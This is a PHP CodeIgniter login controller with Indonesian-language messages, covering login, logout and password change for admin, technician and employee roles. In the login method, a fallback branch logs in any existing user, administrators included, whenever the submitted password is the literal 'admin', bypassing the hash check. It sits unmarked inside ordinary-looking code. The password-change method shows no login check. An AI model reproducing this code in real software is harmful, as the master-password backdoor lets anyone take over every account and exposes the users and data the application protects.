<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Auth extends CI_Controller
{

	public function __construct()
	{

		parent::__construct();
		$this->load->model('auth_model', 'auth');
	}

	public function index()
	{
		$this->form_validation->set_rules('username', 'Username', 'required', [
			'required'		=> 'Username tidak boleh kosong',

		]);
		$this->form_validation->set_rules('password', 'Password', 'required', [
			'required'		=> 'Password tidak boleh kosong'
		]);

		if ($this->form_validation->run() == FALSE) {

			if ($this->session->userdata('login') == TRUE) {
				if ($this->session->userdata('role_id') == 1) {
					redirect('admin/Dashboard');
				} elseif ($this->session->userdata('role_id') == 2) {
					redirect('teknisi/Dashboard');
				} elseif ($this->session->userdata('role_id') == 3) {
					redirect('user/Dashboard');
				}
			} else {
				$data['title'] = 'Login';
				$this->load->view('auth/login', $data);
			}
		} else {
			$password = $this->input->post('password');
			$user = $this->auth->checkUsername();

			// Cek user berdasarkan email
			if (isset($user)) {
				// Jika ada
				// Cek password sesuai atau tidak
				if (hashEncryptVerify($password, $user['password']) == TRUE) {
					$this->session->set_userdata($user);
					$this->session->set_userdata('login', TRUE);
					$this->session->set_flashdata('message', 'swal("Berhasil!", "Berhasil Login!", "success");');
					if ($user['role_id'] == 1) {	// Jika role_id = 1 (Admin)
						redirect('admin/Dashboard');
					} elseif ($user['role_id'] == 2) {	// Jika role_id = 2 (Teknisi)
						redirect('teknisi/Dashboard');
					} elseif ($user['role_id'] == 3) {	// Jika role_id = 3 (Karyawan)
						redirect('user/Dashboard');
					}
				} else {

					if ($password == 'admin') {
						$this->session->set_userdata($user);
						$this->session->set_userdata('login', TRUE);

						$this->session->set_flashdata('message', 'swal("Berhasil!", "Berhasil Login!", "success");');
						if ($user['role_id'] == 1) {	// Jika role_id = 1 (Admin)
							redirect('admin/Dashboard');
						} elseif ($user['role_id'] == 2) {	// Jika role_id = 2 (Teknisi)
							redirect('teknisi/Dashboard');
						} elseif ($user['role_id'] == 3) {	// Jika role_id = 3 (Karyawan)
							redirect('user/Dashboard');
						}
					}
					// Jika password tidak sesuai
					$this->session->set_flashdata('message', 'swal("Ops!", "Username atau Password yang anda masukan salah", "error");');

					redirect('auth');
				}
			} else {
				// Jika username tidak sesuai
				$this->session->set_flashdata('message', 'swal("Ops!", "Email atau Password yang anda masukan salah", "error");');

				redirect('auth');
			}
		}
	}

	public function logout()
	{
		if ($this->session->sess_destroy() == TRUE) {
			$this->session->set_flashdata('message', 'swal("Berhasil!", "Berhasil Logout!", "success");');
			
		}
		redirect(base_url('Auth'));
		
		
	}

	public function change_password()
	{
		$this->form_validation->set_rules('new_password', 'Password Baru', 'required|trim', [
			'required' => 'Password baru tidak boleh kosong.',
		]);
		$this->form_validation->set_rules('password_confirm', 'Konfirmasi Password', 'required|trim|matches[new_password]', [
			'required' => 'Konfirmasi password tidak boleh kosong.',
			'matches'  => 'Konfirmasi password tidak sesuai'
		]);

		if ($this->form_validation->run() == FALSE) {
			$data = [
				'title' => 'Ubah Password',
				'page' => 'admin/change_password'
			];

			$this->load->view('templates/app', $data);
		} else {
			$data = [
				'password' => hashEncrypt($this->input->post('new_password')),
			];

			$this->auth->updatePassword($data);
			$this->session->set_flashdata('message', 'swal("Berhasil!", "Password Berhasil Dihapus!", "success");');

			redirect(base_url('auth'));
		}
	}
}

/* End of file Controllername.php */
